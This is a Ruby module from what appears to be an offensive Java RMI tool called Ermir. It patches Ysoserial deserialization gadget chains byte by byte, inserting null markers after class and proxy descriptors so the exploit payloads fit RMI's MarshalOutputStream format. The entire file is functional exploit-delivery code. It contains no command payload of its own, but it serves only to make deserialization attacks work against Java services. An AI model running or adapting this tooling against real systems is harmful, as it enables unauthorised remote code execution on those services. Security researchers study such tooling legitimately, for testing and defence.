require_relative 'transport_constants'

module Ermir
  module GadgetMarshaller
    # this is currently working for most of Ysoserial gadgets but it is not 100% reliable
    # better use gadgetmarshal / GadgetMarshaller.java packaged with Ermir to rewrite the gadgets
    # in case of custom gadgets use the internal MarshalOutputStream instead of ObjectOutputStream.

    def patch_gadget!
      @gadget_chunked = []
      @gadget_bytes = @gadget.bytes
      open = false

      @gadget_bytes.each_with_index do |byte, idx|
        if (byte == TransportConstants::TC_CLASSDESC || byte==TransportConstants::TC_PROXYCLASSDESC) && !open
          open = true
          @gadget_chunked << []
        end
        if byte == TransportConstants::TC_ENDBLOCKDATA && open
          if (@gadget_bytes[idx...idx+2] == [TransportConstants::TC_ENDBLOCKDATA, TransportConstants::TC_NULL]) || @gadget_bytes[idx+1].between?(0x70, 0x7D)
            open = false
          end
        end
        if @gadget_chunked[-1].is_a?(Array) && open
          @gadget_chunked[-1] << byte
        else
          @gadget_chunked << byte
        end
      end

      if @gadget_chunked[-2..-1] == [TransportConstants::TC_ENDBLOCKDATA, TransportConstants::TC_NULL]
        @gadget_chunked.insert(-3, TransportConstants::TC_NULL) if @gadget_chunked[-3] != TransportConstants::TC_NULL
      end

      get_previous_element = -> (i) {@gadget_chunked[i-1].is_a?(Array) ? @gadget_chunked[i-1][-1] : @gadget_chunked[i-1]}

      @gadget_chunked.map!.with_index do |element, i|
        if element.is_a?(Array)
          if element[0] == TransportConstants::TC_CLASSDESC
            if class_desc?(i)
              patch_chunk(i)
            else
              element
            end
          elsif element[0] == TransportConstants::TC_PROXYCLASSDESC
            if proxy_desc?(i)
              patch_chunk(i)
            else
              element
            end
          else
            element
          end
        else
          if element == TransportConstants::TC_ENDBLOCKDATA && get_previous_element.(i) != TransportConstants::TC_NULL
            if @gadget_chunked[i..].flatten[0..3] == [TransportConstants::TC_ENDBLOCKDATA, TransportConstants::TC_NULL, TransportConstants::TC_OBJECT, TransportConstants::TC_CLASSDESC] \
              || get_previous_element.(i) == 0x3B && @gadget_chunked[i..].flatten[0..1] == [TransportConstants::TC_ENDBLOCKDATA, TransportConstants::TC_NULL] \
              || get_previous_element.(i) == 0x0 && @gadget_chunked[i..].flatten[0..2] == [TransportConstants::TC_ENDBLOCKDATA, TransportConstants::TC_NULL, 0x0] \
              || @gadget_chunked[i..].flatten[0..2] == [TransportConstants::TC_ENDBLOCKDATA, TransportConstants::TC_CLASSDESC, 0x0]
              [TransportConstants::TC_NULL, element]
            else
              element
            end
          else
            element
          end
        end
      end.flatten!

      @outfile.write(@gadget_chunked.pack("C*")) if (defined?(@outfile) && @outfile && @outfile.is_a?(File))
      @gadget = @gadget_chunked.pack("C*")
    end

    def class_desc?(idx)
      pos = 0
      chunk = @gadget_chunked[idx].pack("C*")
      return false if chunk.size < 5
      pos += 1
      class_name_size = chunk[pos...pos+2].unpack("S>")[0]
      pos += 2
      return false if pos+class_name_size > chunk.size || class_name_size>100
      class_name = chunk[pos...pos+class_name_size]
      pos += class_name_size
      return false if pos+1+8+2 > chunk.size
      valid_class_name?(class_name)
    end

    def proxy_desc?(idx)
      pos = 0
      chunk = @gadget_chunked[idx].pack("C*")
      return false if chunk.size < 5
      pos += 1
      interface_count = chunk[pos...pos+4].unpack("L>")[0]
      return false if interface_count > 10
      pos += 4
      interface_count.times do
        interface_name_size = chunk[pos...pos+2].unpack("S>")[0]
        return false if pos+interface_name_size>chunk.size
        pos += 2
        interface_name = chunk[pos...pos+interface_name_size]
        valid_class_name?(interface_name)
      end
    end

    def valid_class_name?(class_name)
      (class_name.count(".") > 1 && class_name.rpartition(".")[-1][0].match?(/[[:upper:]]/)) \
      || ([0x5B, 0x4C].include?(class_name[0].ord) && class_name[-1].ord == 0x3B)
    end

    def patch_chunk(i)
      @gadget_chunked[i] << TransportConstants::TC_NULL
    end
  end
end